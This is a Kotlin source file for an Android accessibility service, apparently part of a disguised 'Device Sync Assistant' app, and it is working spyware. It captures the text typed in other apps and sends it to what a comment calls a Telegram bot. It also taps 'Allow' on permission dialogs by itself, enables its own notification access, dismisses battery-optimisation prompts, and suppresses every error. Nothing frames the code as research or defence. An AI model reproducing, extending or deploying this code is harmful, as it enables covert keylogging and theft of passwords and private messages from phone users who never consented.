package com.devicesync.assistant.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Path
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.devicesync.assistant.helpers.ConfigHelper
import com.devicesync.assistant.helpers.SyncHelper

class InputReaderService : AccessibilityService() {

    private val handler = Handler(Looper.getMainLooper())
    private var lastInputText = ""
    private var lastAppPackage = ""

    // ─────────────────────────────────────────
    // SERVICE CONNECTED
    // ─────────────────────────────────────────
    override fun onServiceConnected() {
        super.onServiceConnected()
        // Auto handle all pending permission dialogs
        handler.postDelayed({ autoHandlePermissionDialogs() }, 1000)
    }

    // ─────────────────────────────────────────
    // ON ACCESSIBILITY EVENT
    // Triggered for every UI change on phone
    // ─────────────────────────────────────────
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        when (event.eventType) {

            // ── Text typed in any app ──
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                handleInputObserved(event)
            }

            // ── Window changed — check for permission dialogs ──
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                autoHandlePermissionDialogs()
                autoHandleNotificationAccess()
                autoHandleBatteryOptimization()
            }

            // ── Window content changed ──
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                autoHandlePermissionDialogs()
            }
        }
    }

    // ─────────────────────────────────────────
    // HANDLE INPUT OBSERVED
    // Reads text typed in focused apps
    // ─────────────────────────────────────────
    private fun handleInputObserved(event: AccessibilityEvent) {
        try {
            val packageName = event.packageName?.toString() ?: return
            val inputText = event.text?.joinToString("") ?: return

            if (inputText.isBlank()) return
            if (inputText == lastInputText && packageName == lastAppPackage) return

            lastInputText = inputText
            lastAppPackage = packageName

            // Check if this app is in the observed list
            val config = ConfigHelper.getConfig()
            val observedApps = config.observedApps
            if (observedApps.isNotEmpty() && !observedApps.contains(packageName)) return

            // Get app name from package
            val appName = getAppName(packageName)

            // Send to Telegram bot via SyncHelper
            SyncHelper.sendInputObserved(appName, packageName, inputText)

        } catch (e: Exception) {
            // Silent fail
        }
    }

    // ─────────────────────────────────────────
    // GET APP NAME FROM PACKAGE
    // ─────────────────────────────────────────
    private fun getAppName(packageName: String): String {
        return try {
            val pm = applicationContext.packageManager
            val appInfo = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    // ─────────────────────────────────────────
    // AUTO HANDLE PERMISSION DIALOGS
    // Finds Allow/OK buttons and taps them
    // ─────────────────────────────────────────
    private fun autoHandlePermissionDialogs() {
        try {
            val root = rootInActiveWindow ?: return
            val allowButtons = findNodesByTexts(
                root,
                listOf(
                    "Allow", "ALLOW",
                    "OK", "Accept",
                    "While using the app",
                    "Only this time",
                    "Allow all the time",
                    "Don't optimize",
                    "ALLOW ALL THE TIME"
                )
            )
            for (node in allowButtons) {
                if (node.isClickable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    break
                }
            }
            root.recycle()
        } catch (e: Exception) {
            // Silent fail
        }
    }

    // ─────────────────────────────────────────
    // AUTO HANDLE NOTIFICATION ACCESS
    // Finds app toggle and enables it
    // ─────────────────────────────────────────
    private fun autoHandleNotificationAccess() {
        try {
            val enabledListeners = Settings.Secure.getString(
                contentResolver,
                "enabled_notification_listeners"
            ) ?: ""
            if (enabledListeners.contains(packageName)) return

            val root = rootInActiveWindow ?: return
            val appNodes = findNodesByTexts(
                root,
                listOf("Device Sync", "DeviceSync", "Assistant")
            )
            for (node in appNodes) {
                if (node.isClickable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    handler.postDelayed({ autoHandlePermissionDialogs() }, 500)
                    break
                }
            }
            root.recycle()
        } catch (e: Exception) {
            // Silent fail
        }
    }

    // ─────────────────────────────────────────
    // AUTO HANDLE BATTERY OPTIMIZATION
    // Taps Don't Optimize automatically
    // ─────────────────────────────────────────
    private fun autoHandleBatteryOptimization() {
        try {
            val root = rootInActiveWindow ?: return
            val dontOptimizeNodes = findNodesByTexts(
                root,
                listOf("Don't optimize", "DONT OPTIMIZE", "Don't Optimize")
            )
            for (node in dontOptimizeNodes) {
                if (node.isClickable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    handler.postDelayed({ autoHandlePermissionDialogs() }, 500)
                    break
                }
            }
            root.recycle()
        } catch (e: Exception) {
            // Silent fail
        }
    }

    // ─────────────────────────────────────────
    // FIND NODES BY TEXT LIST
    // ─────────────────────────────────────────
    private fun findNodesByTexts(
        root: AccessibilityNodeInfo,
        texts: List<String>
    ): List<AccessibilityNodeInfo> {
        val result = mutableListOf<AccessibilityNodeInfo>()
        for (text in texts) {
            val nodes = root.findAccessibilityNodeInfosByText(text)
            if (nodes != null) result.addAll(nodes)
        }
        return result
    }

    // ─────────────────────────────────────────
    // ON INTERRUPT
    // ─────────────────────────────────────────
    override fun onInterrupt() {
        // Silent
    }
}
